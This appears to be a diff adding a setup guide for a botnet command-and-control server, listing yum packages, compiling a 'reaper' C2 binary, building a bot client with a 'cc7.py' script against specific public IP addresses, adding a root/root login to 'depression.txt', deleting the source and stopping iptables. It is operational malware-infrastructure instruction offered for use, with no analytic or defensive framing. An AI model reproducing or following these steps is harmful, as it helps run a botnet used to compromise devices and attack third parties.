@@ -1,0 +1,26 @@
+yum update -y
+yum install python-paramiko gcc screen nano wget httpd iptables perl -y;
+yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
+yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
+yum install epel-release -y
+yum install gengetopt -y
+
+```
+change ips and botport in client and put on server
+MAKE SURE TO PUT RESOLVER.H ON SERVER ASWELL!!
+```
+gcc -o reaper reaper.c -pthread
+python cc7.py client1.c 46.101.35.30
+ex: python cc7.py client.c 185.244.25.122
+
+echo root root >> depression.txt
+rm -rf reaper.c
+screen ./reaper $Botport 1 $connectionport
+
+ex: screen ./reaper 282 1 8090
+
+Done!!
+if the login prompt doesnt show up run these
+
+service iptables stop
+service httpd restart
